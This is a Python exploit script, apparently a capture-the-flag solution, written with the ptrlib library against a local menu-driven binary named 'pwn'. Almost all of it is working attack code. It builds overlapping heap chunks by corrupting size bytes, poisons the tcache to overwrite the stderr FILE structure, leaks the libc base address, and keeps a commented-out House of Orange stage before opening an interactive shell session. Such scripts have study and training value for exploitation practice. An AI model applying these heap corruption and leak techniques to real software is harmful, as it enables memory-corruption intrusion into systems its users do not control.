from ptrlib import *

def alloc(size, data):
    sock.recvuntil("> ")
    sock.sendline("1")
    sock.recvuntil("size: ")
    sock.sendline(str(size))
    sock.recvuntil("data: ")
    sock.send(data)

def edit(index, byte):
    sock.recvuntil("> ")
    sock.sendline("2")
    sock.recvuntil("index: ")
    sock.sendline(str(index))
    sock.recvuntil("byte: ")
    sock.send(str(byte))

def delete():
    sock.recvuntil("> ")
    sock.sendline("3")

def print_name():
    sock.recvuntil("> ")
    sock.sendline("4")
    sock.recvuntil("pwner: ")
    return sock.recvline().rstrip()

libc = ELF("./libc.so.6")
elf = ELF("./pwn")
sock = Process("./pwn")
main_arena = 0x3ebc40
delta = 1168

# Name
sock.recvuntil("name: ")
sock.sendline("taro")

## Chunk overlap
alloc(0x18, "B" * 0x18)
delete() # push to tcache
alloc(0x28, "A" * 0x28)
delete()
alloc(0x18, "B" * 0x18)
edit(0x18, 0x01) # 0x31 --> 0x01
edit(0x19, 0x05) # 0x01 --> 0x501
edit(0x18 + 0x500, 0x31) # fake chunk size
edit(0x18 + 0x500 + 0x30, 0x31)
alloc(0x28, "A" * 0x18)
delete() # pon!

## TCache Poisoning to leak libc
alloc(0x68, "CCCC")
delete()
delete()
alloc(0x68, p64(elf.symbol("stderr")))
alloc(0x68, "Hello")
alloc(0x68, "X" * 8) # stderr
alloc(0x68, p64(0xfbad2a84)) # _IO_2_1_stderr_
# change 0x603260 --> 0x60f260
edit(0x109, 0xf2)

while True:
    r = sock.recv().replace(b"\x00", b"")
    if b'\x7f' in r:
        break
addr_main_arena = u64(r[r.index(b"Hello") + 5: r.index(b"Hello") + 5 + 6])
libc_base = addr_main_arena - main_arena - delta
logger.info("libc base = " + hex(libc_base))

"""
## House of orange
for i in range(634):
    alloc(0x78, "Dummy")

# Overwrite top
edit(0x78, 0x51)
edit(0x79, 0x0)
edit(0x7a, 0x0)
edit(0x7b, 0x0)
"""
sock.interactive()
